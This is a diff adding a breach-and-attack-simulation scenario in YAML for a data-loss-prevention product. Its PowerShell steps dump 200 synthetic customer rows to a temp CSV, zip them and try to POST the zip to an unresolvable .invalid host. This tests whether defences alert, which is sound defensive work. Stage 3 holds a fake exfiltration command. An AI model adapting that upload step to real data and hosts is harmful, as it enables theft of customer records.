@@ -1,0 +1,162 @@
+id: collection-database-export-exfil
+product_line: dlp
+name: Database Export, Archive and Outbound Probe
+description: >
+  Telemetry-safe emulation of an adversary dumping a database table to a flat
+  file, archiving it, and attempting to send it out. No database is contacted.
+  The "export" is a CSV of synthetic [BAS-SIM] customer rows generated at run
+  time, so it exercises the file, archive and egress path a real dump would
+  take without touching any real records.
+
+  KILL CHAIN STAGES:
+    1. Database Export Simulation — write a synthetic table dump to a temp CSV (T1005)
+    2. Export Archive             — compress the dump natively (T1560.001)
+    3. Dump Upload Attempt        — POST the archive to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: All rows are synthetic and tagged [BAS-SIM]. No database, ODBC source,
+  or credential store is accessed. The archive and CSV are deleted in cleanup.
+  Destinations are .invalid and cannot resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - database
+  - exfiltration
+  - dlp
+  - data-theft
+  - bfsi
+  - t1005
+  - t1560
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Database Export Simulation (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "DB Export 1 — Synthetic Table Dump to Temp CSV (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes a CSV of 200 synthetic [BAS-SIM] customer rows into a per-run folder under %TEMP%. No database connection is made. The CSV mimics the shape of a real table export so that DLP and EDR see a bulk structured dump."
+    telemetry:
+      - "Sysmon EID 11: CSV file created under %TEMP%\\bas_dbexp_<runid>"
+      - "DLP: bulk structured export (200 rows, account-number-shaped columns)"
+    detection:
+      - "DLP: structured table export written outside the database host's normal paths"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_dbexp_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $csv = Join-Path $work 'customers.csv'
+      $rows = foreach ($i in 1..200) {
+        [pscustomobject]@{
+          customer_id = ('BAS-SIM-{0:d6}' -f $i)
+          name        = ('[BAS-SIM] Test Customer {0:d3}' -f $i)
+          account_no  = ('BAS-SIM-ACC-{0:d8}' -f ($i * 7919))
+          branch      = 'BAS-SIM-BR-01'
+        }
+      }
+      $rows | Export-Csv -Path $csv -NoTypeInformation -Encoding UTF8
+      $count = @(Import-Csv $csv).Count
+      Write-Output "EXEC T1005: wrote $count synthetic row(s) to $csv. No database was contacted. Export Stage 1. [BAS-SIM-DBX-S1]"
+      Write-Output "FAIL: A structured customer-table export was written to a temp folder without a DLP alert. Bulk structured exports from a data store are a core DLP inspection case."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Export Archive (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "DB Export 2 — Native Archive of the Dump (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Compresses the synthetic CSV from Stage 1 into a zip with Compress-Archive, in the same per-run folder. Archiving is how an adversary prepares a dump for transfer. Nothing is encrypted and nothing leaves the host in this stage."
+    telemetry:
+      - "Sysmon EID 1: powershell.exe with Compress-Archive"
+      - "Sysmon EID 11: customers.zip created"
+    detection:
+      - "EDR: archive created from a fresh bulk export — pre-exfil staging IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_dbexp_$runId"
+      $csv = Join-Path $work 'customers.csv'
+      if (-not (Test-Path $csv)) {
+        Write-Output "SKIP: T1560.001: no export from Stage 1 to archive. [BAS-SIM-DBX-S2]"
+        exit 0
+      }
+      $zip = Join-Path $work 'customers.zip'
+      Compress-Archive -Path $csv -DestinationPath $zip -Force
+      $size = (Get-Item $zip).Length
+      Write-Output "EXEC T1560.001: archived the synthetic export to $zip ($size bytes). Export Stage 2. [BAS-SIM-DBX-S2]"
+      Write-Output "FAIL: A bulk table export was archived with no alert. Archiving a fresh dump is the step that makes it portable for exfiltration."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Dump Upload Attempt to .invalid (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "DB Export 3 — Dump Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts an HTTP POST of the synthetic archive from Stage 2 to an RFC-6761 .invalid host. The host cannot resolve, so no data leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress log: outbound POST of a zip archive"
+    detection:
+      - "Egress filter: archive upload to an unknown host — database exfiltration attempt"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_dbexp_$runId"
+      $zip = Join-Path $work 'customers.zip'
+      if (-not (Test-Path $zip)) {
+        Write-Output "SKIP: T1048.003: no archive from Stage 2 to send. [BAS-SIM-DBX-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-dbx-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $zip -ContentType 'application/zip' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the synthetic archive to $target. reached=$reached (expected: false). Dump upload Stage 3. [BAS-SIM-DBX-S3]"
+      if ($reached) {
+        Write-Output "FAIL: A database-shaped archive was uploaded to an unknown host. Egress controls are not stopping a bulk table dump from leaving the network."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to upload a database-shaped archive to an unknown host. Unreachable only because the domain is .invalid; the attempt is the signal egress and DLP should alert on."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_dbexp_*') -Recurse -Force -ErrorAction SilentlyContinue
